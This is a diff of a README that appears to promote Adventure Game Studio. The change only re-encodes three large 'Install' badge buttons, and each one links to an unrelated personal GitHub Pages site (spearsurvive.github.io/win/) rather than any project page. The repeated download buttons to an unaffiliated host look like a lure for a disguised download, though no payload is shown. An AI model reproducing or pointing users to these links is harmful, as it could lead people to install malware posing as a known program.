@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Adventure Game Studio](https://img.shields.io/badge/⬇_Install_Adventure%20Game%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Adventure Game Studio](https://img.shields.io/badge/⬇_Install_Adventure+Game+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Adventure Game Studio is a free and open-source development environment designed
 
 <div align="center">
 
-[![⬇ Install Adventure Game Studio](https://img.shields.io/badge/⬇_Install_Adventure%20Game%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Adventure Game Studio](https://img.shields.io/badge/⬇_Install_Adventure+Game+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Adventure Game Studio is a free and open-source development environment designed
 
 <div align="center">
 
-[![⬇ Install Adventure Game Studio](https://img.shields.io/badge/⬇_Install_Adventure%20Game%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Adventure Game Studio](https://img.shields.io/badge/⬇_Install_Adventure+Game+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
